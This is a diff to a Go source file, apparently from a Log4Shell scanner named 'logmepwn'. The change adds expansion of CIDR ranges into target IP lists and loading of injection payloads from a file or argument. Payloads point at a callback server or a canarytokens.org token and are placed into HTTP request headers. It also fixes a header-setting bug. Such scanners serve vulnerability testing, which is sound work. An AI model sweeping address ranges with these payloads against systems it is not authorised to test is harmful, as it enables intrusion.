@@ -1,11 +1,14 @@
 package main
 
 import (
+	"bufio"
 	"context"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io/ioutil"
 	"log"
+	"net"
 	"os"
 
 	"github.com/valyala/fasthttp"
@@ -25,8 +28,8 @@ func cookHTTPRequest(httpMethod, requri string, headers map[string]string, body 
 	if len(body) > 0 {
 		req.SetBody(body)
 	}
-	for val := range headers {
-		req.Header.Set(val, xload)
+	for key, val := range headers {
+		req.Header.Set(key, val)
 	}
 	// set a custom user agent if supplied
 	if len(userAgent) > 0 {
@@ -119,4 +122,84 @@ Content-Disposition: form-data; name="redirect_url"
 	log.Println("Writing token details to file 'canarytoken-logmepwn.json'...")
 	ioutil.WriteFile("canarytoken-logmepwn.json", mbody, 0644)
 	return canaryResp.Token
+}
+
+func genCIDRxIPs(cidr string) *[]string {
+	ip, ipnet, err := net.ParseCIDR(cidr)
+	if err != nil {
+		log.Fatalln(err.Error())
+	}
+	var ips []string
+	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incrementIP(ip) {
+		ips = append(ips, ip.String())
+	}
+	lenIPs := len(ips)
+	switch {
+	case lenIPs < 2:
+		return &ips
+
+	default:
+		ips = ips[1 : len(ips)-1]
+		return &ips
+	}
+}
+
+func incrementIP(ip net.IP) {
+	for j := len(ip) - 1; j >= 0; j-- {
+		ip[j]++
+		if ip[j] > 0 {
+			break
+		}
+	}
+}
+
+func getPayloads() *[]string {
+	var payloads []string
+	if _, err := os.Stat(customPayload); err != nil {
+		// user has supplied a single payload
+		if errors.Is(err, os.ErrNotExist) {
+			payloads = append(payloads, customPayload)
+		}
+	} else {
+		// the file exists
+		file, err := os.Open(customPayload)
+		if err != nil {
+			log.Fatalln(err.Error())
+		}
+		scanner := bufio.NewScanner(file)
+		scanner.Split(bufio.ScanLines)
+		for scanner.Scan() {
+			payloads = append(payloads, scanner.Text())
+		}
+		if err := scanner.Err(); err != nil {
+			log.Fatalln(err.Error())
+		}
+		file.Close()
+	}
+	return &payloads
+}
+
+func processPayloads() error {
+	// if user has supplied a custom payload (which will include their hostname)
+	if len(customPayload) > 0 {
+		xload = *getPayloads()
+		return nil
+	}
+
+	// if user has callback server, we use the default payload scheme
+	if len(customServer) > 0 {
+		xload = append(xload, fmt.Sprintf(genericPayFormat, customServer))
+		return nil
+	}
+
+	// if custom callback server is not supplied, we generate a canary token
+	if len(canaryToken) < 1 {
+		canaryToken = getToken()
+		if len(canaryResp.Auth) > 0 {
+			manageUrl := fmt.Sprintf("https://canarytokens.org/history?token=%s&auth=%s", canaryResp.Token, canaryResp.Auth)
+			log.Printf("Visit '%s' for seeing the triggers of your payloads.", manageUrl)
+		}
+	}
+	xload = append(xload, fmt.Sprintf(canaryTokenFormat, canaryToken))
+	return nil
 }
